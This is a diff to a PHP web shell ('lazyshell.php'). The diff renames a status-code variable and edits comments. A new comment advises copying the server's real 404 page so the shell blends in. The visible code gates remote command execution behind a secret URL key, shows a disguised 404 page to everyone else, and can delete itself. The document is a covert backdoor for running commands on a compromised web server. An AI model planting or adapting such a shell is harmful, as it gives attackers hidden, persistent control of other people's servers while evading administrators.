@@ -6,13 +6,14 @@
 
 // Usage: http://HOSTNAME/lazyshell.php?key=YOUR-SUPER-SECRET-KEY
 
-// The secret key you will use to access the shell using the "?key=" URL parameter.
+// The secret key you will use to access the shell via the "?key=" URL parameter.
 $secretkey = 'YOUR-SUPER-SECRET-KEY';
 
-// The HTTP status code of the error page which will be returned if an invalid, or no secret key is specified.
-$errorcode = 404;
+// The HTTP status code of the error page which will be returned if an invalid secret key, or no secret key is specified.
+$statuscode = 404;
 
-// The error page HTML code which will be displayed if an invalid, or no secret key is specified.
+// The error page HTML code which will be displayed if an invalid secret key, or no secret key is specified.
+// To blend in with the rest of the application/server, copy the HTML from the 404 page and paste it here.
 $errorpagehtml = '<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
 <html><head>
 <title>404 Not Found</title>
@@ -31,7 +32,7 @@ if (isset($_POST['execute']) && !empty($_POST['command']) && $_POST['key'] == $s
     unlink(__FILE__);
     exit('Shell removed!');
 } elseif ($_GET['key'] != $secretkey) {
-    http_response_code($errorcode);
+    http_response_code($statuscode);
     exit($errorpagehtml);
 }
 ?>
